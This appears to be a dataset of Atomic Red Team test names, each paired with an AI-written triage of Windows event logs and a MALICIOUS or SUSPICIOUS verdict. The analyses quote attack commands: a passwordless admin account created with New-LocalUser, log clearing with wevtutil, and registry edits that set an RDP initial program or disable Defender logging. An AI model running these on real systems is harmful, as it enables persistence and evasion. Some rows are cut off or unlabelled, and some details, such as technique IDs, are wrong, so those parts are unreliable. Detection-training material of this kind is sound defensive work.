   - The Sysmon log indicates that `powershell.exe` was used to execute a command consistent with creating a new local user named ""Administrator"" without a password (`New-LocalUser -Name \""Administrator \"" -NoPassword`). This can indicate unauthorized user account creation.
   - Security log shows events related to user account manipulation (Event IDs 4720, 4722, 4728, 4738) within a short time, which aligns with the suspicious PowerShell activity.

3. **Time Change**:
   - Logs show the system time was changed (Event ID 4616) which can be another tactic used to misalign logging events or revert modifications for stealth.

4. **Process Execution**:
   - Frequent execution of `wevtutil.exe` from `C:\Windows\System32\` which is used for interacting with event logs (clearing logs) is observed.
   - The invocation of `hostname.exe` and `whoami.exe` may suggest reconnaissance activities.

5. **System Integrity and Security Risks**:
   - Several events involve `conhost.exe` processes frequently interacting with other processes such as `whoami.exe`, `hostname.exe`, and `powershell.exe`, which is unusual unless the user is actively managing the system from a command-line interface.
   - Logs show `MicrosoftEdgeUpdate.exe` and related processes interacting in unusual contexts especially considering the other indicative malicious actions.

### Assessment and Conclusion:
- The clearest and most concerning indicator is the execution of what appears to be an unauthorized PowerShell command to create a new administrator user account, coupled with log clearing actions. These actions combined with the time change event and manipulation of user accounts suggest a compromise aimed at gaining and hiding elevated access on the system.

### Resolution:
- **MALICIOUS** - The activities observed, especially the unauthorized user creation and log clearing, strongly indicate malicious actions that require immediate remediation.

### Guidance for Action:
1. **Immediate Response**: 
   - Disconnect the affected host from the network to prevent lateral movement by the threat actor.
   - Initiate a full forensic investigation to uncover the extent of the breach, including identifying any other potentially compromised accounts.
   - Change all critical credentials, especially those with administrator access.

These measures are crucial for understanding the breach impact and preventing future incidents."
Masquerade as a built-in system executable,"Upon reviewing the provided logs, several aspects stand out that suggest possible malicious activity:

1. **PowerShell Logs:**
   - A script involving `powershell.exe` was executed which added a type definition, compiled it using `Add-Type`, and output a DLL named `svchost.exe` into the `C:\Windows\Temp` directory. Subsequently, this temporary `svchost.exe` was executed using `Start-Process`.
   - Utilizing PowerShell to compile code and execute it immediately is a common technique used by attackers to run malicious payloads.

2. **Sysmon Logs:**
   - The `svchost.exe` compiled and executed in the `C:\Windows\Temp` directory has several signs of being suspicious. This location is not typical for legitimate `svchost.exe` files.
   - Processes initiated from PowerShell making use of .NET’s command-line compiler (`csc.exe`) also raise red flags, as this is often seen in fileless malware activities or when attackers are trying to obfuscate their tools.

3. **Event Log Clearing:**
   - There were logs indicating the event logs were cleared (`EventID 104 in System and 1102 in Security logs`). Clearing event logs is indicative of an attempt to cover tracks, which is a strong indicator of malicious activity.

4. **Other System Logs:**
   - The presence of the events associated with a Microsoft Defender update appears normal and routine.

In conclusion, activities involving the unusual use of PowerShell, temporary production and execution of a file in `C:\Windows\Temp` with the name `svchost.exe`, immediate execution of this file, and the clearing of event logs are all behaviors typically associated with malicious efforts.

Resolution: **MALICIOUS**

Recommendations on how to proceed:
- Immediately isolate the affected host from the network to prevent further propagation or damage.
- Conduct a comprehensive forensic analysis on this host to determine if other components or malware are present.
- Review network traffic from and to this host for additional indicators of compromise.
- Strengthen PowerShell logging and consider measures to block potentially harmful PowerShell scripts.
- Consider implementing application whitelisting to prevent the execution of unauthorized binaries in unexpected locations like `C:\Windows\Temp`.
- Conduct an organization-wide security awareness training to prevent similar incidents, focusing on the anomalous use of administrative tools."
Event Viewer Registry Modification - Redirection Program,"After analyzing the provided logs from the Windows host, several potentially suspicious activities were identified:

### Key Observations:

1. **Repeated Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility was used multiple times with the `cl` parameter for clearing logs such as Microsoft-Windows-Sysmon/Operational, Application, and Security logs. This behavior is highly concerning as it can be indicative of a malicious actor attempting to cover tracks by clearing event logs to erase evidence of their actions.

2. **Log Files Cleared:**
   - The Security logs show a clearing event (Event ID 1102) by the user `admin_test`, as well as similar events in the System logs (Event ID 104). Log clearing, particularly in security contexts, is generally suspicious and suggests a potential attempt to hide malicious activity.

3. **Use of `cmd.exe` with Suspicious Commands:**
   - Observed usage of `cmd.exe` with a registry add command to potentially redirect the Event Viewer to open Notepad. This involves modifying the registry key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer`, which is not usual behavior and suggests an attempt to interfere with normal system operations.

4. **Time Change Event (Event ID 4616):**
   - A time change was detected, which can sometimes be used to manipulate the timestamps of events for obfuscation purposes. Although time changes can occur for benign reasons, in combination with the other activities, this raises concern.

5. **Use of Administrative Privileges:**
   - The user `admin_test` has privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., as indicated by Event ID 4672 in the Security logs. While this user could be a legitimate administrator, the simultaneous use of powerful privileges alongside log-clearing events further supports the possibility of malicious activity.

### Assessment:
The activities observed within these logs—clearing of event logs, suspicious use of `cmd.exe` and registry modification, coupled with administrative privilege usage, and potentially altering system time—align with typical tactics used by malicious actors to maintain persistence, evade detection, and cover tracks after unauthorized access or malicious actions.

### Resolution:
Based on the alarming actions and their potential implications, the situation is assessed as:

- **MALICIOUS** - Logs contain activity that suggests malicious intent and clear attempts to cover tracks.

### Recommended Actions:
1. **Immediate Incident Response:**
   - Isolate the impacted host (Server002) from the network to prevent further potential damage.
   - Initiate a full forensic investigation to determine the extent of the compromise and gather evidence.

2. **Log Reconstruction and Analysis:**
   - Attempt to reconstruct cleared logs, if possible, using backups or other endpoints and look for any signs of initial compromise or lateral movement.

3. **System Hardening:**
   - Verify the integrity of critical system files and registry configurations.
   - Implement stricter controls over the use of administrative privileges and enhance monitoring for privileged account usage.

4. **User Access Review:**
   - Review user accounts and privileges to identify any unauthorized or unnecessary privileges.

5. **Patch and Update:**
   - Ensure all systems are up to date with the latest security patches.

6. **Enhanced Monitoring:**
   - Increase the logging level, especially for sensitive operations, and improve alerting mechanisms for similar anomalous activities in the future."
UACME Bypass Method 34,"After analyzing the provided logs, there are several indicators of potentially malicious behavior:

1. **Event Log Clearing:**
   - There are multiple instances of the event log being cleared (EventID 104 for System and PowerShell logs, and EventID 1102 for Security logs).
   - The `wevtutil` tool is used to clear logs, executed by the user `SERVER002\admin_test`.
   - Clearing event logs is often a sign of an attacker attempting to cover their tracks.

2. **Suspicious Process Execution:**
   - An execution of `cmd.exe` with the command line involving `uacme\\34 Akagi64.exe`. This is part of the UACMe tool, used to bypass User Account Control (UAC) in Windows for privilege escalation.

3. **Use of Atomic Red Team Tool:**
   - The presence of `AtomicRedTeam` in the paths indicates the use of known security testing tools, which can sometimes be used by threat actors in red team engagements or malicious activities.

4. **Integrity Level:**
   - Several processes are running with a high integrity level, which is typical for administrative tasks. However, combined with the log clearing and UAC bypass attempts, it could imply unauthorized administrative actions.

5. **Frequent Use of Cmd and PowerShell:**
   - There are several cmd.exe and powershell.exe processes initiated, specifically noting privilege elevation paths which can be indications of exploitation attempts.

6. **Processes Started by Admin User:**
   - The clearing of logs and suspicious processes like `wevtutil` and `cmd.exe` are initiated by `SERVER002\admin_test`, pointing towards activities of a compromised admin account or an insider.

Based on the above analysis, the behavior exhibited in the logs contains strong indicators of unauthorized and potentially malicious activity. The use of UAC bypass tools, the presence of red teaming tools, combined with efforts to obfuscate or erase traces via log clearing, makes the activity highly suspicious.

### Assessment:
**Resolution:** MALICIOUS

### Threats/Risks Identified:
- Privilege escalation via UAC bypass tools.
- Potential insider threat or compromised account.
- Log clearance to hide malicious activities.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected host (`Server002`) to prevent further lateral movement.
   
2. **User Account Security:**
   - Review the account activities for `admin_test` and any associated accounts for misuse.
   - Change credentials and audit for any unauthorized access.

3. **Detailed Investigation:**
   - Conduct root cause analysis to determine how UACMe was deployed.
   - Analyze any related network logs to identify possible command-and-control connections.

4. **Enhance Monitoring:**
   - Implement enhanced monitoring for critical system events, especially around administrative and security tools.
   - Consider employing host-based intrusion detection systems to detect similar behavior in the future.

5. **Remediation and Cleaning:**
   - Clean up any unauthorized tools or scripts that were deployed.
   - Validate the integrity of the system and potentially reinstall or restore from clean backups if compromise is deep.

This incident should be escalated for a more comprehensive security review and potential forensic analysis."
Execution of program.exe as service with unquoted service path,"Based on the provided event logs, the following analysis identifies potential indicators of suspicious and possibly malicious activity:

1. **Security Log Analysis:**
   - Event ID 1102 indicates that the security log was cleared by a user account `admin_test`. Clearing event logs is a common technique used by malicious actors to cover their tracks. This action is suspicious and suggests possible malicious intent.

2. **Sysmon Log Analysis:**
   - Several instances of `wevtutil.exe` being executed by `admin_test`:
     - Commands executed were to clear event logs: `wevtutil.exe cl Application`, `wevtutil.exe cl System`, and `wevtutil.exe cl Security`.
     - The repeated clearing of logs across different channels (Application, System, Security) strongly suggests efforts to hide activity, a tactic often used by attackers post-compromise.
   - Execution of `cmd.exe` with a command to copy and create a new service (`Example Service`) using `WindowsServiceExample.exe`:
     - The process involves using `cmd.exe` to duplicate a binary to system folders and create a persistent service set to auto-start using `sc.exe`.
     - This is characteristic of malicious behavior aiming to establish persistence within the system.
   
3. **System Log Analysis:**
   - Event ID 104 indicates logs being cleared from the System channel by `admin_test`, consistent with the suspicious activity identified in Sysmon logs.
   - Service creation detected with Event ID 7045 (`Example Service`) running as `LocalSystem` also corresponds with Sysmon observations, confirming suspicious activity.

4. **Application Log Analysis:**
   - No directly related suspicious activity detected in the application log that adds additional context to the concerning actions noted above.

**Assessment:**
The logs show strong indications of suspicious and likely malicious activity, specifically:
- Log clearing activities across multiple log types by a nonstandard user account are consistent with covering tracks post-attack.
- The creation and starting of a new service using potentially unauthorized binaries suggest escalation of privileges or persistence mechanisms, typical of a post-exploitation scenario.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately isolate the affected host `Server002` to prevent further potential damage and lateral movement within the network.
- Conduct a full forensic investigation to identify the origin of the compromise.
- Review user activities associated with `admin_test` to determine how permissions were acquired and examine account usage across the network.
- Implement monitoring and alerting for similar log clearing and service creation activities.
- Enhance security posture by refining access controls, potentially including 2FA, and ensuring up-to-date antivirus definitions and patch management."
Kill Event Log Service Threads,"Upon analyzing the provided logs from the Windows host, certain entries indicate suspicious behavior that requires further investigation. Below is a summary of the analysis:

### Suspicious Activities Identified:

1. **Clearing of Windows Logs:**
   - **Event ID 104** and **1102**: The logs indicate that multiple logs (System, Windows PowerShell, and Security) were cleared by the user ""admin_test."" Clearing logs, especially the Security and PowerShell logs, is usually performed to hide traces of malicious activities and is a strong indicator of a cover-up attempt.

2. **PowerShell Command Execution:**
   - **Event ID 1 (Sysmon)** and **600 (Windows PowerShell)**: These entries show the execution of PowerShell with a script being downloaded from a GitHub repository (`Invoke-Phant0m.ps1`). This script is known for terminating Windows Event Log services to disable security monitoring, which is a typical evasive maneuver by malicious actors.

3. **Privilege Escalation:**
   - **Event ID 4672**: The user ""admin_test"" acquired several high privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and others. Such privileges allow significant control over the system and are commonly leveraged during escalations or lateral movements.

4. **Time Manipulation:**
   - **Event ID 4616**: There is an event showing a time change on the system, which can be utilized to confuse timeline analysis in forensic investigations.

5. **Execution of System Utilities:**
   - Frequent execution of `wevtutil.exe` and other commands under high integrity levels indicates manipulation of system-level operations, possibly for log clearance or other unauthorized administrative actions.

### Assessment and Resolution:

Given the activities identified in the logs—especially the clearing of logs, suspicious PowerShell activity involving a known malicious script, privilege escalation, and modification of system timestamps—I assess the situation as indicative of **malicious activity**.

### Guidance on How to Proceed:

1. **Containment:**
   - Immediately isolate the affected host (`Server002`) from the network to prevent further spread or exfiltration of data.

2. **Investigation:**
   - Conduct a thorough forensic analysis on the host to determine the extent of the compromise, potentially including memory dumps and disk imaging.
   - Investigate user account ""admin_test"" activities, including credential usage and access logs, across the environment to check for additional malicious activity.

3. **Remediation:**
   - Reset passwords and verify access permissions for ""admin_test"" and any other potentially compromised accounts.
   - Review and enhance logging and monitoring setup across the network to detect and alert on similar activities in the future.

4. **Communication:**
   - Communicate with legal and compliance teams regarding potential breaches and data protection implications.
   - Share indicators of compromise (IOCs) with the incident response team for broader awareness.

5. **Review Security Measures:**
   - Ensure that security patches are up to date, and evaluate the effectiveness of security tools and controls, including Endpoint Detection and Response (EDR) solutions.

Given the analyzed activities, the resolution for this situation is determined to be **MALICIOUS**."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"Based on the provided event logs, here are the significant observations:

1. **Suspicious PowerShell Usage**:
   - We have a PowerShell command being executed with the ""-nop"" (No Profile) parameter and a command line that includes executing a `Write-Host` command. While the command itself is not necessarily malicious, powershell.exe being executed with ""-nop"" can be indicative of an attempt to run PowerShell scripts without leaving traces or using system settings that might otherwise restrict execution. 
   - Log entry shows PowerShell being used to clear logs, which is often seen in ""anti-forensics"" or attempts to cover tracks. 

2. **Log Clearing Events**:
   - Multiple logs have been cleared by the user SERVER002\admin_test. Specifically, system and security logs were cleared. This behavior is often observed during malicious activities when an attacker tries to cover their tracks.

3. **Use of `wevtutil.exe`**:
   - This command is being executed multiple times with the purpose of clearing logs (for example, by using `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). This is a strong indicator of suspicious activity because `wevtutil.exe` is a legitimate utility used for event log management, but its misuse for clearing logs by an admin user suggests an attempt to hide activities.

4. **Execution of PowerShell from within MSI installation**:
   - A process involving `msiexec.exe` is involved in installing a DLL from a temporary directory associated with Atomic Red Team, which is known for its adversary simulation activities. The PowerShell command executed (e.g., `Write-Host CustomAction export executed me; exit`) could be a benign part of automated testing or could be part of an attack simulation.

5. **Atomic Red Team DLL Loading**:
   - The presence of `T1218.007_DLL.msi` being executed through `msiexec.exe` with command-line execution of PowerShell. This particular DLL (based on MITRE ATT&CK framework) is known for its technique to bypass detection, which is used often in adversary simulation.

6. **Clearing of Event Logs**:
   - The combination of PowerShell commands, `wevtutil.exe`, and admin activities clearing event logs is consistent with known tactics to evade detection.

**Assessment and Resolution**:

The activities observed are highly suggestive of adversary simulation or penetration testing exercises. The logs show classic techniques used for testing defenses, such as privilege escalation simulations, lateral movement attempts, or execution of code via PowerShell. Given the known usage of Atomic Red Team for benign red teaming exercises and the structured pattern of the observed activities:

**Resolution**: SUSPICIOUS
  
This verdict is because the actions align with known attack techniques but could be conducted under legitimate security testing circumstances. Additional inquiry should include verifying engagement with security consultants or internal red team exercises to confirm the benign nature of these activities. If not, treat as potentially malicious and investigate further while ensuring monitoring for real compromises."
Mshta Executes Remote HTML Application (HTA),"### Detailed Analysis of the Logs

#### Windows PowerShell Log Analysis:

- **PowerShell Commands**: The logs indicate execution of the following script via PowerShell:
  - Fetching a file from GitHub using `Invoke-WebRequest`.
  - Saving the content as `T1218.005.hta` in the Startup folder.
  - Executing the `.hta` file using `mshta`.
  - After a sleep period, forcibly stopping the ""calculator"" process.
  
  The use of `mshta` to execute an .hta file that is fetched remotely is characteristic of a common technique used for executing malicious scripts, which is known as a living-off-the-land binary (LOLBin) technique (T1218.005 in the MITRE ATT&CK framework).

#### Application Log Analysis:

- **Edge Update**: The entries that indicate stopping of the edge update service appear benign and are likely part of regular operation during software updates.

#### System Log Analysis:

- **Event Log Clearing**: The system and particularly the Windows PowerShell event logs were cleared by the user 'admin_test'. Clearing of logs, especially security-related logs (event ID 1102), can be indicative of an attempt to cover tracks after a potentially malicious activity.

#### Security Log Analysis:

- **Event Log Clearing**: Similar to the system logs, the security logs were cleared by 'admin_test'. This is included in the security logs as event ID 1102, indicating potential tampering or cover-up of unauthorized or malicious activities.

#### Sysmon Log Analysis:

- **Process Creation**: The use of `wevtutil.exe` to clear logs (`cl` command) for various logs (including Sysmon) confirms suspicious activity as this utility is commonly misused for such purposes to hide traces of actions.
- **Execution of `mshta` and `cmd.exe`**: The execution of `mshta.exe` pointing to the fetched .hta file and `cmd.exe` executing `calc.exe` aligns with a known suspicious pattern.

### Assessment and Conclusion:

The logs show distinct indicators of potentially malicious activity:
1. **File Download and Execution**: The PowerShell logs show the download and execution of a script via `mshta` – a strong indicator of suspicious or unauthorized activity.
2. **Log Clearing Activities**: The deliberate clearing of event logs, particularly shortly after suspicious script execution from the PowerShell session, strongly suggests an attempt to hide malicious actions.
3. **Use of Living-off-the-land Binaries**: The use of `mshta` for execution of potentially downloaded payloads.

Based on these observations, there are strong indicators of malicious behavior in the provided logs, specifically the execution of unauthorized scripts and attempts to cover tracks by clearing event logs.

### Resolution
- **Resolution: MALICIOUS**
- **Recommendations**:
  - Immediately isolate the host from the network to prevent further potential malicious activities.
  - Conduct a full forensic analysis on `Server002`, including memory and disk analysis, to identify any installed malware or persistent threats.
  - Review the access permissions and recent activities associated with the user `admin_test`.
  - Implement stricter monitoring and alerting for PowerShell and event log clearing activities.
  - Inform the relevant incident response teams and consider the need for organizational threat hunting based on findings."
Windows - Modify file last access timestamp with PowerShell,"### Detailed Analysis

**1. Event Logs Clearing:**

- **System, Security, and PowerShell Logs Cleared:**
  - **System Log Entry 3571 and Security Log:** Logs indicate that the `admin_test` user cleared the system log using a process with PID 5540. A similar action occurred for the Windows PowerShell log with PID 1480. Both events occurred at the same timestamp and involved the use of the `wevtutil.exe` utility.
  - **Security Concern:** Clearing logs is often considered a suspicious activity as it can be a tactic to cover up malicious actions. It's particularly concerning when performed by non-standard accounts or outside of scheduled maintenance windows.

**2. Suspicious PowerShell Activity:**

- **PowerShell Log Event Entries:**
  - A PowerShell command was executed with the application `powershell.exe` manipulating a file's last access time: `T1551.006_timestomp.txt`. This action is synonymous with 'timestomping,' a tactic to avoid detection by altering file timestamps.
  - **Analysis:** This action emerged from a tool typically associated with security testing, as indicated by the path `/AtomicRedTeam/..`.

**3. Use of `wevtutil.exe`:**

- Numerous entries in the Sysmon logs show the execution of `wevtutil.exe` by the `admin_test` user across various timestamps, primarily related to clearing different logs (System, Security, Windows PowerShell logs).
- **Analysis:** The utility is used for managing Windows event logs, but its repetitive use in this context supports malicious intent to clear and manipulate event logs.

**4. Sysmon Logs Indications:**

- Processes were initiated by `admin_test`, including executions of `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`. The initial use of `wevtutil.exe` was followed by starting a Console Window Host `conhost.exe` for each instance.
- **Analysis:** This sequence appears systematic and repetitive, aligning with scripts automated to tamper with logs.

**5. Microsoft Edge Update and `sppsvc.exe`:**

- There is scheduled execution of `MicrosoftEdgeUpdate.exe` and `sppsvc.exe`. These could be legitimate, ongoing processes not directly linked to the other activities.
- **Analysis:** While not unusual by themselves, the presence and context do not confirm malicious activity.

### Assessment and Resolution

**Suspicious Behavior Stands Out:**
- Clearing of the system, security, and PowerShell logs by `admin_test`, alongside systematic use of `wevtutil.exe`, and timestamp manipulation through PowerShell are red flags indicating potential malicious intent.
- Presence of the Atomic Red Team path signifies potential security testing or an intruder attempting to use security tools for malicious purposes.

**Resolution:**
- **MALICIOUS:** Given the systematic log clearing, PowerShell activity that mimics known malicious techniques like timestomping, and the possible intent to cover tracks, the actions identified within these logs are highly indicative of malicious activity.

### Guidance and Next Steps

1. **Immediate Containment:**
   - Disable or closely monitor the account `admin_test` to prevent further unauthorized access.
   
2. **Thorough Investigation:**
   - Analyze processes and tools executed under `admin_test` to map out any additional malicious activity.
   - Retrieve backups of cleared logs if possible for further analysis.

3. **Forensics and Mitigation:**
   - Implement stricter logging and monitoring, increasing alerts for actions involving `wevtutil.exe` or similar utilities.
   - Verify the integrity of critical systems and applications possibly affected by the timestamps manipulation.

4. **Audit Security Policies:**
   - Review access permissions and logging policies to ensure only authorized personnel can clear logs, with alerts for any such actions.

These steps will address potential compromise and avert future threats of a similar nature."
Disable Windows Error Reporting Settings,"Based on the provided event logs, the following analysis highlights suspicious or potentially malicious activities:

### Suspicious or Anomalous Behavior:
1. **Log File Cleared:**
   - The security, system, and Windows PowerShell event logs were cleared (EventID 1102 and 104, respectively). This action was performed by the user ""admin_test"" and is often a critical indicator of potential malicious intent. Clearing logs can be an attempt to erase traces of unauthorized or malicious activities.

2. **Privilege Elevation:**
   - EventID 4672 indicates that the ""admin_test"" account initiated a special privileges assignment, including SeDebugPrivilege and SeSystemEnvironmentPrivilege. Such privileges allow a process to inspect and alter the memory of any process. This level of access should be scrutinized, especially when combined with other suspicious activities.

3. **Cmd Execution with Potential Malicious Intent:**
   - The command executed by `cmd.exe` involves modifying registry keys related to Windows Defender notifications (CmdLine `reg add HKLM64...`). Disabling enhanced notifications is commonly associated with attempts to prevent security alerts, indicating potential hostile behavior.

4. **Command Line Utility Usage:**
   - `wevtutil.exe` is used to clear event logs (as seen in multiple sysmon logs with EventID 1 and 5). The clearing of logs using the `cl` (clear) command suggests an effort to tamper with forensic evidence.

### Malicious Indicators:
- The combination of clearing event logs, escalating privileges, and modifying security-related registry settings all strongly indicate a potentially ongoing malicious attack to maintain persistence, cover tracks, and reduce detection by security software.

### Assessment:
The cumulative evidence from the logs—clearing of logs, privilege escalation, modification of security settings—points toward malicious activity. These activities suggest an attempt to compromise the host's security integrity, hide the tracks of unauthorized access, and potentially disable security services.

### Recommendation:
- **Isolate the Host:** To prevent potential spread or further compromise, immediately isolate the affected host from the network.
- **Investigate Further:** Conduct a forensic analysis focused on the timeline of the events to identify any additional compromised accounts or lateral movements.
- **Review User Account Activities:** Validate all administrator-level activities performed by ""admin_test"" and any associated accounts.
- **Restore System State:** Consider restoring the system from a known good backup after thorough investigation if compromise is confirmed.

### Resolution:
- **MALICIOUS** - The provided logs exhibit activities consistent with a malicious compromise, including log tampering, privilege escalation, and potential security defenses weakening. Prompt action should be taken to address the issue."
Disable Powershell ETW Provider - Windows,"Upon analyzing the provided logs, the following observations stand out as potential indications of malicious activity:

### Indicators of Potential Malicious Activity:

1. **Execution of PsExec and Clearing of Logs:**
   - The logs show several instances of `PsExec.exe` being executed from a temporary directory: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\pstools\\PsExec.exe""`.
   - PsExec is a legitimate tool used for executing processes on remote systems, but it is commonly leveraged by attackers for privilege escalation and lateral movement.
   - The `PsExec` commands include the `-accepteula`, `-i`, and `-s` flags, indicating execution with elevated privileges.
   - Log files for System, Security, and Windows PowerShell channels were cleared (`EventID 1102` for Security log, and `EventID 104` for System and PowerShell logs). This action is often an attempt to cover tracks.

2. **Commands and Suspicious Command-Line Arguments:**
   - Multiple instances of PowerShell, cmd.exe, and wevtutil.exe executing with suspicious command-line arguments, such as modifying logs or services.
   - Wevtutil commands to clear event logs like `System`, `Security`, and `Windows PowerShell`, which aligns with malicious behavior attempting to erase evidence.
   - The execution of the command `logman update trace EventLog-Application --p Microsoft-Windows-Powershell -ets` might indicate attempts to manipulate logging related to PowerShell activities.

3. **Service Creation and Manipulation:**
   - The service `PSEXESVC` was created using PsExec and started under the LocalSystem account (EventID 7045). Such actions can provide unauthorized persistence mechanisms on the host.

### Risk Assessment:

- The observed activities, particularly the clearing of critical event logs, the use of administrative tools in non-standard paths, and the creation of services using PsExec, are consistent with typical behaviors observed in cyber incursions or malicious intrusions.
- The usage of the Atomic Red Team's directory structure in the command lines suggests that these actions might be part of security testing or red team exercises. However, without explicit prior authorization or documentation, these actions are suspicious at best and potentially malicious at worst.

### Guidance:

1. **Immediate Actions:**
   - Verify if this was an authorized activity for legitimate security testing. If unauthorized, these activities should be considered a compromise.
   - Conduct a comprehensive scan of the host for malware or unauthorized access.
   - Review access controls and user permissions to ensure no unauthorized privilege escalations occurred.

2. **Long-term Mitigations:**
   - Implement stricter monitoring and alerting for the use of PsExec or similar administrative tools.
   - Inspect all cleared logs and investigate the timeline for other suspicious activities that might be correlated.
   - Enhance logging policies to include better protection and auditing, making unauthorized changes more difficult.

### Resolution:

**MALICIOUS** - Given the evidence of log clearing, unauthorized potential use of administrative access, and the behavior of typical compromise tactics, I assess this activity as malicious unless there is proven prior authorization for these actions. Further investigation and immediate corrective measures are recommended."

#### Identified Events and Their Significance

1. **Security Logs:**
   - **EventID 1102**: This indicates that the security event log was cleared. The action was performed by the user `admin_test`. Clearing of logs, especially by an admin account, can be indicative of malicious intent, as it is often an attempt to hide traces of unauthorized activity.

2. **Application Logs:**
   - **Windows Defender State**: Indication that Windows Defender is on; however, it doesn't provide further context about any detections or prevention events.
   - **EdgeUpdate Service Stopped**: Stopping services themselves are not necessarily malicious, but could be part of benign system updates as seen with frequent Microsoft Edge update processes.

3. **Sysmon Logs:**
   - Notable use of **`wevtutil.exe`** to clear various event logs (Security, Application, System, Windows PowerShell) by the `admin_test` user using command lines like `wevtutil.exe cl Security`. The use of this command to clear logs aligns with potentially malicious behavior aimed at obscuring activity.
   - **`cmd.exe` Execution**: There is execution of `cmd.exe` invoking `regsvr32.exe` with a path indicating potential misuse of `regsvr32` for executing DLL (`AllTheThingsx86.dll`). This pattern of DLL execution could be part of lateral movement or persistence techniques.
   - Various **Microsoft Edge Update** processes were observed and are consistent with updates, given their patterns and timings.

4. **System Logs:**
   - Again show logs being cleared on different channels by the `admin_test` account using the same signature as observed in the Sysmon logs.

#### Conclusion

- The actions observed, especially clearing of security logs and usage of `wevtutil.exe` by an administrative account, are highly indicative of an attempt to cover tracks by a potential attacker. Moreover, the process execution involving `regsvr32.exe` and suspicious DLLs suggests possible malicious execution or persistence methods.

SIP (Subject Interface Package) Hijacking via Custom DLL,"After analyzing the provided logs, there are several events that raise suspicion and warrant further investigation:

1. **Log Clearing Activity**: There are multiple instances of event log clearing detected. Specifically, the following entries indicate that the System, Application, and Windows PowerShell logs were cleared:
    - Event ID 104 from the System log: Indicates the system log was cleared.
    - Event ID 104 from the Application log: Indicates the application log was cleared.
    - Event ID 104 from the Windows PowerShell log: Indicates the PowerShell log was cleared.
   These actions were performed by a user named ""admin_test."" The manual clearing of logs can be a tactic used by attackers to hide their tracks.

2. **PowerShell Execution**: There are entries indicative of PowerShell commands executed with restricted execution policies. This includes:
    - Event ID 600 from the Windows PowerShell log, showing PowerShell being executed with command-line arguments. Although the actions themselves (reading INF files) don't immediately suggest maliciousness, the execution of scripts with restricted policies warrants closer scrutiny.

3. **Suspicious Command Execution**: Notably, there was execution of the `regsvr32.exe` command with the loading of a DLL:
    - Event ID in Sysmon log where ""cmd.exe"" was used to execute ""regsvr32.exe"" with a DLL path related to a testing suite (AtomicRedTeam, T1553.003). This type of execution is known for potentially being leveraged for DLL side-loading attacks.

Overall, these indicators suggest possible malicious activity:

- Log clearing operations are commonly associated with attempts to cover tracks.
- PowerShell scripts executed with suspicious patterns and restricted execution policies.
- A command execution pattern commonly associated with binary loading attacks.

Given these points, the resolution of this investigation is:

Modify RDP-Tcp Initial Program Registry Entry,"After analyzing the provided Windows event logs from various sources, I've identified several entries that are indicative of suspicious and potentially malicious activity.

### Suspicious and Potentially Malicious Activity:
1. **Log Clearing Activity**:
   - **System Log** and **Security Log** both show `EventID 104` and `EventID 1102`, indicating that logs for both the System and Security event logs were cleared by a user named `admin_test`. This action can be indicative of malicious activity as attackers often clear logs to cover their tracks.

2. **Command Line Registry Edits**:
   - In the **Sysmon log**, there's a recorded process creation (`cmd.exe`) with a command line that includes registry modifications related to RDP settings:
     ```
     reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v fInheritInitialProgram /t REG_DWORD /d 1 /f & reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v InitialProgram /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f
     ```
   - This command line changes the behavior of Remote Desktop Protocol (RDP), which can be an indicator of backdoor installation or other malicious configuration changes.

3. **Privilege Escalation**:
   - In the **Security log**, `admin_test` is granted multiple high-level privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`) which could be used for malicious activities such as data exfiltration or further compromise of system integrity.

### Assessment:
- **Clear Evidence of Event Log Tampering**: The clearing of event logs by `admin_test` is highly suspicious and often part of malicious actor activity.
- **Potential Configuration and Access Manipulation**: Registry edits to RDP settings are often part of establishing persistent access, which aligns with typical post-compromise tactics.
- **High-Level Privileges**: The acquisition of several high-level privileges by `admin_test` can be an attempt to perform unrestricted operations across the system, which warrants further investigation.

### Resolution:
Based on the logs and activities observed, the situation should be classified as: 
- **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected machine (Server002) from the network to prevent further malicious activities or data exfiltration.
2. **Further Investigation**: Conduct a detailed forensic analysis to identify how the compromise occurred and if any backdoor has been installed.
3. **Audit User Activity**: Review all activities done by the `admin_test` account around the event times to assess additional suspicious behavior.
4. **Review and Restore System Integrity**: Check all configuration files and settings, particularly around RDP and other frequently targeted systems.
5. **Log Retention and Monitoring**: Implement stricter log retention policies and establish alerting mechanisms to detect future log clearing activities immediately.
6. **Revise Access Controls**: Assess and tighten account permissions and review account usage to prevent unauthorized privilege escalations."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"Upon review of the provided event logs, the following observations and findings can be made:

1. **Security Log (EventID: 1102):**  
   This log entry indicates that the security log was cleared by a user named `admin_test`. The action of clearing logs, especially security logs, can be considered suspicious as it might be an attempt to cover tracks of potentially malicious activity.

2. **System Log (EventID: 104):**  
   The system and PowerShell logs were cleared by the same user, `admin_test`, with a high integrity level. Consistently across these entries, the logs are being cleared, which raises a red flag about the user's intentions.

3. **Sysmon Logs:**
   - **EventID 1 and 5 with `wevtutil.exe`:**  
     There are multiple events showing the execution of `wevtutil.exe` with the command line `cl`, which stands for ""clear"". This utility is used to clear event logs, aligning with the previous point of logs being cleared.
     
   - **EventID 1 with `cmd.exe` and `reg.exe`:**  
     The logs indicate a command being run through `cmd.exe` to alter the registry key for disabling Windows Defender operations log (`/v Enabled /t REG_DWORD /d 0 /f`). This shows an attempt to hinder Windows Defender's logging capabilities, which is a significant indicator of malicious intent.

4. **Application and PowerShell Logs:**  
